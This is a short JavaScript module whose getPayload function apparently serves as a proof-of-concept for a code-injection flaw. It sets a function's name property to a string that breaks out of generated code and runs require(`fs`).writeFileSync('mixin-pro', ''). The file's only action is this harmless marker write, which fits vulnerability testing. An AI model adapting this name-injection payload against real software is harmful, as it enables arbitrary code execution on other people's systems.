function getPayload() {
    function Foo() { }
    Object.defineProperty(Foo, "name", {
        enumerable: false,
        configurable: false,
        writable: true,
        value: 'static'
    });
    Foo.name = "test2()\n{}; require(`fs`).writeFileSync('mixin-pro', ''); function __ctor"
    return { Foo };
}

module.exports = { getPayload };